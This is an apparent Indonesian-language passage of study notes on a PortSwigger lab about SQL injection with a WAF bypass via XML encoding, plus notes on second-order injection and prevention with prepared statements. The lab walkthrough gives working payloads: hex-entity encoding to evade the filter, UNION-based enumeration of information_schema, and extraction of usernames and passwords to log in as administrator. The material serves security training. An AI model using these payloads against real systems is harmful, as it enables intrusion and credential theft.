Format berbeda ini mungkin memberikan cara berbeda untuk mengobfuscate serangan yang biasanya diblokir karena WAF dan mekanisme pertahanan lain. Implementasi lemah sering cari keyword SQL injection umum di dalam request, jadi Anda mungkin bisa bypass filter ini dengan encoding atau escaping karakter di keyword yang dilarang. Contoh, SQL injection berbasis XML berikut pakai escape sequence XML untuk encode karakter `S` di `SELECT`.

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Ini akan di-decode server-side sebelum dikirim ke interpreter SQL.

#### Lab: SQL Injection dengan Filter Bypass via XML Encoding

Lab ini berisi kerentanan SQL injection di fitur stock check. Hasil dari kueri dikembalikan di respons aplikasi, jadi Anda bisa pakai serangan UNION untuk ambil data dari tabel lain.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.15</summary>

Basis data berisi tabel `users`, yang berisi username dan password user terdaftar. Untuk menyelesaikan lab, lakukan serangan SQL injection untuk ambil kredensial user admin, lalu login ke akun mereka.

> **Catatan:** Web application firewall (WAF) akan blokir request yang berisi tanda-tanda jelas serangan SQL injection. Anda perlu cari cara untuk obfuscate kueri berbahaya Anda untuk bypass filter ini. Kami sarankan pakai ekstensi Hackvektor untuk ini.

![Buka Lab 0.15](images/lab-0.15-xml-filter-bypass/open-lab-0.15.png)

![Tangkap Request XML dan Kirim ke Repeater 0.15](images/lab-0.15-xml-filter-bypass/capture-xml-request-repeater-0.15.png)

![SQL Injection Diblokir WAF - Attack Detected 0.15](images/lab-0.15-xml-filter-bypass/sql-injection-waf-blocked-0.15.png)

![Konversi Payload Pakai Hex Entities 0.15](images/lab-0.15-xml-filter-bypass/hex-entities-encoding-0.15.png)

![Uji Time-Based SQL Injection 0.15](images/lab-0.15-xml-filter-bypass/time-based-sqli-test-0.15.png)

![Tentukan Jumlah Kolom Pakai ORDER BY 1 - 0.15](images/lab-0.15-xml-filter-bypass/order-by-1-column-test-0.15.png)

![ORDER BY 2 Menyebabkan Error Kolom 0.15](images/lab-0.15-xml-filter-bypass/order-by-2-column-error-0.15.png)

![Uji UNION SELECT NULL 0.15](images/lab-0.15-xml-filter-bypass/union-select-null-test-0.15.png)

![Enumerasi Nama Tabel Pakai Information Schema 0.15](images/lab-0.15-xml-filter-bypass/information-schema-table-enumeration-0.15.png)

![Temukan Tabel Users Pakai Information Schema 0.15](images/lab-0.15-xml-filter-bypass/users-table-discovery-0.15.png)

![Enumerasi Kolom Tabel Users - Email Username Password 0.15](images/lab-0.15-xml-filter-bypass/users-table-column-enumeration-0.15.png)

![Ambil Username dan Password 0.15](images/lab-0.15-xml-filter-bypass/extract-usernames-passwords-0.15.png)

![Login sebagai Administrator 0.15](images/lab-0.15-xml-filter-bypass/administrator-login-0.15.png)

![Berhasil Selesaikan Lab 0.15](images/lab-0.15-xml-filter-bypass/lab-solved-0.15.png)

#### Tutorial


##### Tutorial

1. Tangkap HTTP Request — Temukan HTTP request yang berisi parameter XML `<productId>` dan kirim ke Repeater.
2. Install Hackvertor — Install ekstensi Hackvertor dari Burp Suite BApp Store. Gunakan tag `hex_entities` untuk encode payload SQL injection jadi entitas XML heksadesimal.
3. Tentukan Jumlah Kolom — Uji jumlah kolom pakai `ORDER BY`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId><@hex_entities>1 ORDER BY 1--</@hex_entities></productId>
  <storeId>2</storeId>
</stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId><@hex_entities>1 ORDER BY 2--</@hex_entities></productId>
  <storeId>2</storeId>
</stockCheck>
```

`ORDER BY 1` sukses, sementara `ORDER BY 2` gagal, menandakan kueri balik satu kolom.

4. Enumerasi Tabel Basis Data

```sql
1 UNION SELECT table_name FROM information_schema.tables--
```

Temukan tabel `users` di hasil.

5. Enumerasi Kolom Tabel

```sql
1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
```

Tabel `users` berisi:
- `email`
- `password`
- `username`

6. Ekstrak Kredensial User

```sql
1 UNION SELECT username || '~' || password FROM users--
```

Respons mengungkap username dan password, termasuk kredensial administrator.

7. Login — Pakai username dan password administrator yang diekstrak untuk login ke aplikasi.
8. Selesaikan Lab — Berhasil login sebagai administrator untuk selesaikan lab.


##### Referensi

<details>
<summary>37. SQL Injection - Lab #17 SQL injection with filter bypass via XML encoding — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=ELdyZm0nK4g
Tujuan: Lab ini berisi kerentanan SQL injection di fitur stock check. Hasil dari kueri dikembalikan di respons aplikasi, jadi Anda bisa pakai serangan UNION untuk ambil data dari tabel lain.
</details>

<details>
<summary>38. SQL injection with Filter Bypass via XML Encoding — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=2iqMm0gMyHk
Tujuan: Belajar kerentanan SQL Injection. Dalam video ini, kita akan lihat cara mengeksploitasi kerentanan SQLi, bypass filter WAF via XML encoding. Kita juga akan jelajahi SQLMap tamper scripts dan [coba] debug masalah encoding.
</details>

</details>

## Second-order SQL Injection

First-order SQL injection terjadi saat aplikasi memproses input user dari request HTTP dan memasukkan input ke kueri SQL dengan cara tidak aman.

Second-order SQL injection terjadi saat aplikasi ambil input user ke basis data, tapi tidak ada kerentanan di titik di mana data disimpan. Nanti, saat handle request HTTP berbeda, aplikasi ambil data tersimpan dan masukkan ke kueri SQL dengan cara tidak aman. Karena itu, second-order SQL injection juga dikenal sebagai stored SQL Injection.

Second-order SQL Injection sering terjadi di situasi di mana developer sadar soal kerentanan SQL injection, dan jadi handle aman penempatan input awal ke basis data. Saat data nanti diproses, dianggap aman, karena sebelumnya diletakkan ke basis data aman. Di titik ini, data dihandle dengan cara tidak aman, karena developer salah anggap itu trusted.

## Cara Mencegah SQL Injection

Anda mencegah instance SQL injection pakai parameterized queries bukan string concatenation di dalam kueri. Parameterized queries ini juga dikenal sebagai "prepared statements".

Kode berikut rentan SQL injection karena input user dikonkatenasi langsung ke kueri:

```sql
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Anda bisa tulis ulang kode ini cara yang mencegah input user mengganggu struktur kueri:

```SQL
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Cara Mencegah SQL Injection - Lanjutan

Anda bisa pakai parameterized queries untuk situasi mana pun di mana input tidak trusted muncul sebagai data di dalam kueri, termasuk klausa `WHERE` dan nilai di statement `INSERT` atau `UPDATE`. Mereka tidak bisa dipakai untuk handle input tidak trusted di bagian lain kueri, seperti nama tabel atau kolom, atau klausa `ORDER BY`. Fungsionalitas aplikasi yang meletakkan data tidak trusted ke bagian-bagian kueri ini butuh pendekatan berbeda, seperti:

- Whitelisting nilai input yang diizinkan.
- Pakai logika berbeda untuk deliver perilaku yang dibutuhkan.

Agar parameterized query efektif mencegah SQL injection, string yang dipakai di kueri harus selalu konstanta hard-coded. Jangan pernah berisi data variabel dari asal manapun. Jangan tergoda memutuskan case-by-case apakah item data trusted, dan lanjut pakai string concatenation di dalam kueri untuk case yang dianggap aman. Mudah bikin kesalahan soal asal data mungkin, atau perubahan di kode lain meng-contaminate data trusted.

## Selamat! Anda telah menyelesaikan SQL Injection.

**SQL Injection (SQLi)**

Learning path ini memperkenalkan SQL Injection (SQLi), salah satu kerentanan keamanan web yang kritis. Anda telah mempelajari cara mendeteksi dan mengeksploitasi SQL Injection untuk menemukan data tersembunyi, memanipulasi perilaku aplikasi, serta memahami teknik-teknik penting untuk mengamankan aplikasi dari serangan SQLi.

[PortSwigger – SQL Injection Learning Path](https://portswigger.net/web-security/learning-paths/sql-injection)

**Status:** Selesai ✓